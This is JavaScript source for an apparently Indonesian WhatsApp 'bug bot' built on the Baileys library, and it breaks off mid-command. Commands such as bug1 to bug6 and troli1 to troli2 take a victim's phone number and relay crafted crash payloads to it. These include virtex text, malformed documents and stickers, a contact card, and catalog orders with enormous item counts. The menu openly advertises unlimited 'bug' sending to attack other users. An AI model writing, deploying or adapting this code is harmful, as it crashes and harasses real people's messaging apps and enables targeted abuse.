"use strict";
const { BufferJSON, WA_DEFAULT_EPHEMERAL, proto, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { downloadContentFromMessage, generateWAMessage, generateWAMessageFromContent, MessageType, buttonsMessage } = require("@adiwajshing/baileys")
const { exec, spawn } = require("child_process");
const { color, bgcolor, pickRandom, randomNomor } = require('./function/console.js')
const { isUrl, getRandom, getGroupAdmins, runtime, sleep, makeid } = require("./function/myfunc");

// database virtex
const { virus } = require('./function/database/virus')
const { virtex } = require('./function/database/virtex')
const { philips } = require('./function/database/philips')
const { ngazap } = require('./function/database/ngazap')
const { buttonvirus } = require('./function/database/buttonvirus')
const { buttonvirus2 } = require('./function/database/buttonvirus2')

// apinya
const fs = require("fs");
const ms = require("ms");
const chalk = require('chalk');
const axios = require("axios");
const moment = require("moment-timezone");

// Database
const setting = JSON.parse(fs.readFileSync('./options/config.json'));
const mess = JSON.parse(fs.readFileSync('./options/mess.json'));
const mekih = fs.readFileSync ('./options/image/modd.jpg')

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async(conn, msg, m, setting, store) => {
try {
let { ownerNumber, botName } = setting
const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
if (msg.isBaileys) return
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const time = moment(new Date()).format("HH:mm");
var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (chats == undefined) { chats = '' }
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = [`${setting.ownerNumber}`,"6285173226065@s.whatsapp.net","6285173226065@s.whatsapp.net"].includes(sender) ? true : false
const pushname = msg.pushName
const body = chats.startsWith(prefix) ? chats : ''
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const isCommand = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'

// Group
const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)

// Quoted
const quoted = msg.quoted ? msg.quoted : msg
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
} else {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
}
}

const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

// auto read
conn.readMessages([msg.key])

const reply = (teks) => {conn.sendMessage(from, { text: teks }, { quoted: msg })}

const virusnya = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

const gifes = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": { 
"videoMessage": { 
"title": `${virtex(prefix)}`,
"h": `${virus}`,
'duration': '99999', 
'gifPlayback': 'true', 
'caption': `${virus}${virtex(prefix)}`,
'jpegThumbnail': mekih
}}}

const gaslex = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": mekih
}
}
}

// Console
if (!isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
}
if (isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

// Casenya
switch(command) {
case 'menu':{
var num = setting.ownerNumber
let teksMenu =`┎━━━━❲ 𝐁𝐔𝐆𝐁𝐎𝐓 - 𝐌𝐃 ❳
│
┝━❑ 𝘽𝙤𝙩 𝙄𝙣𝙛𝙤
│
┝⟩ Library : *Baileys-MD*
┝⟩ BotName : ${setting.botName}
┝⟩ Tanggal : ${tanggal}
┝⟩ Jam : ${jam} *WIB*
│
┝━❑ 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨 (𝗼𝘄𝗻𝗲𝗿 𝗼𝗻𝗹𝘆)
│
┝⟩ #kick @tag
┝⟩ #demote @tag
┝⟩ #promote @tag
┝⟩ #tagall <text>
┝⟩ #hidetag <text>
┝⟩ #revoke <only grup>
┝⟩ #linkgrup <only grup>
┝⟩ #delete <reply pesan>
│
┝━❑ 𝗕𝗨𝗚 𝗨𝗡𝗟𝗜𝗠𝗜𝗧𝗘𝗗 (𝗼𝘄𝗻𝗲𝗿 𝗼𝗻𝗹𝘆)
│
┝⟩ #sendbug1 <virtex>
┝⟩ #sendbug2 <virus>
┝⟩ #sendbug3 <philips>
│
│  𝘾𝙤𝙣𝙩𝙤𝙝 :
┝⟩ #sendbug1 628xxx|jumlah
│
┝━❑ 𝗕𝗨𝗚 𝗩1 (𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗰𝗵𝗮𝘁)
│
┝⟩ #ci [ bugvn free ]
┝⟩ #hi [ bugvn free ]
┝⟩ #bi [ bugvn free ]
┝⟩ #ha [ bugvn free ]
┝⟩ #hu [ bugvn free ]
┝⟩ #he [ bugvn free ]
┝⟩ #ba [ bugvn free ]
┝⟩ #be [ bugvn free ]
┝⟩ #bu [ bugvn free ]
┝⟩ #ca [ bugvn free ]
┝⟩ #cu [ bugvn free ]
┝⟩ #co [ bugvn free ]
│
┝━❑ 𝗕𝗨𝗚 𝗩2 (𝗮𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆)
│
┝⟩ #bug1 [ bugstick ]
┝⟩ #bug2 [ bugaudio ]
┝⟩ #bug3 [ bugimage ]
┝⟩ #bug4 [ bugdocum ]
┝⟩ #bug5 [ bugextends ]
┝⟩ #bug6 [ bugcontact ]
│
│  𝘾𝙤𝙣𝙩𝙤𝙝 :
┝⟩ #bug1 628xxxxxx
│
┝━❑ 𝗕𝗨𝗚 𝗩3 (𝗮𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆)
│
┝⟩ #doc1 628xxxx [ bugdocu ]
┝⟩ #doc2 628xxxx [ bugdocu ]
┝⟩ #doc3 628xxxx [ bugdocu ]
┝⟩ #doc4 628xxxx [ bugdocu ]
┝⟩ #doc5 628xxxx [ bugdocu ]
│
┝━❑ 𝗕𝗨𝗚 𝗩4 (𝗮𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆)
│
┝⟩ #virus1 628xxxx [ bugteks ]
┝⟩ #virus2 628xxxx [ bugteks ]
┝⟩ #virus3 628xxxx [ bugteks ]
┝⟩ #virus4 628xxxx [ bugteks ]
┝⟩ #virus5 628xxxx [ bugteks ]
│
┝━❑ 𝗕𝗨𝗚 𝗩5 (𝗮𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆)
│
┝⟩ #virtex1 628xxxx [ bugteks ]
┝⟩ #virtex2 628xxxx [ bugteks ]
┝⟩ #virtex3 628xxxx [ bugteks ]
┝⟩ #virtex4 628xxxx [ bugteks ]
┝⟩ #virtex5 628xxxx [ bugteks ]
│
┝━❑ 𝗕𝗨𝗚 𝗩6 (𝗮𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆)
│
┝⟩ #philips1 628xxxx [ bugteks ]
┝⟩ #philips2 628xxxx [ bugteks ]
┝⟩ #philips3 628xxxx [ bugteks ]
┝⟩ #philips4 628xxxx [ bugteks ]
┝⟩ #philips5 628xxxx [ bugteks ]
│
┝━❑ 𝗕𝗨𝗚 𝗩7 (𝗮𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆)
│
┝⟩ #troli1 628xxxx [ bugkatalog ]
┝⟩ #troli2 628xxxx [ bugkatalog ]
┝⟩ #troli3 628xxxx [ bugkatalog ]
┝⟩ #troli4 628xxxx [ bugkatalog ]
│
┕━━━━━━━━━━━━━━━━⊱
® owner by @${num.split('@')[0]}

𝐈𝐊𝐋𝐀𝐍 𝐁𝐎𝐓
Mau jadi admin group??
biar bisa kirim bug sepuasnya!!
Chat owner bot di atas`
mentions(teksMenu, [num])
}
break
case 'runtime':
case 'tes':
if (!isOwner) return reply(mess.OnlyOwner)
reply(`Status Bot Online :\n${runtime(process.uptime())}`)
break
case 'bug1':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
var sticker = generateWAMessageFromContent(num, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: num, quoted: virusnya })
mentions(`*Sukses Mengirim Bug5*
*ID:* @${num.split("@")[0]}
*Type:* sticker.message`, [num])
conn.relayMessage(num, sticker.message, { messageId: sticker.key.id })
}
break
case 'bug2':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
var audio = generateWAMessageFromContent(num, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: num, quoted: virusnya })
mentions(`*Sukses Mengirim Bug1*
*ID:* @${num.split("@")[0]}
*Type:* audio.message`, [num])
conn.relayMessage(num, audio.message, { messageId: audio.key.id })
}
break
case 'bug3':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
var messa = await prepareWAMessageMedia({ image: mekih }, { upload: conn.waUploadToServer })
var image = generateWAMessageFromContent(num, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `? FallGnZ-Bot?MD${ngazap(prefix)}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: num, quoted: virusnya })
mentions(`*Sukses Mengirim Bug2*
*ID:* @${num.split("@")[0]}
*Type:* image.message`, [num])
conn.relayMessage(num, image.message, { messageId: image.key.id })
}
break
case 'bug4':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
var messa = await prepareWAMessageMedia({ image: mekih }, { upload: conn.waUploadToServer })
var document = generateWAMessageFromContent(num, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `? GuraBot?MD${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: num, quoted: virusnya })
mentions(`*Sukses Mengirim Bug3*
*ID:* @${num.split("@")[0]}
*Type:* document.message`, [num])
conn.relayMessage(num, document.message, { messageId: document.key.id })
}
break
case 'bug5':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
var extended = generateWAMessageFromContent(num, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n? FallGnZ-Bot?MD`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "Undangan Grup WhatsApp",
"title": `? FallGnZ-Bot?MD${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: num, quoted: virusnya })
mentions(`*Sukses Mengirim Bug4*
*ID:* @${num.split("@")[0]}
*Type:* extended.message`, [num])
conn.relayMessage(num, extended.message, { messageId: extended.key.id })
}
break
case 'bug6':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
var contact = generateWAMessageFromContent(num, proto.Message.fromObject({
"contactMessage": {
"displayName": `? FallGnZ-Bot?MD${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:𝙁𝙖𝙡𝙡𝙂𝙣𝙕\nitem1.TEL;waid=6285173226065:+62 851-7322-6065\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer GuraBot?MDWhatsApp / Script Bot ORDER ? CHAT AJA ?\nX-WA-BIZ-NAME:Haikal\nEND:VCARD",
}
}), { userJid: num, quoted: virusnya })
mentions(`*Sukses Mengirim Bug6*
*ID:* @${num.split("@")[0]}
*Type:* contact.message`, [num])
conn.relayMessage(num, contact.message, { messageId: contact.key.id })
}
break
case 'troli1':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/mods.jpg') }, { upload: conn.waUploadToServer })
var order = generateWAMessageFromContent(num, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./image/mods.jpg'),
"orderTitle": `© 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩${ngazap(prefix)}`,
"sellerJid": "6281511480762@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: num, quoted: virusnya })
conn.relayMessage(num, order.message, { messageId: order.key.id })
mentions(`*Sukses Mengirim BugTroli1*
*ID:* @${num.split("@")[0]}
*Type:* Katalog`, [num])
}
break
case 'troli2':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
var order = generateWAMessageFromContent(num, proto.Message.fromObject({
"orderMessage": {
"orderId": "449756950375071",						
"itemCount": 99999999999,			
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩${ngazap(prefix)}`,
"jpegThumbnail": mekih,
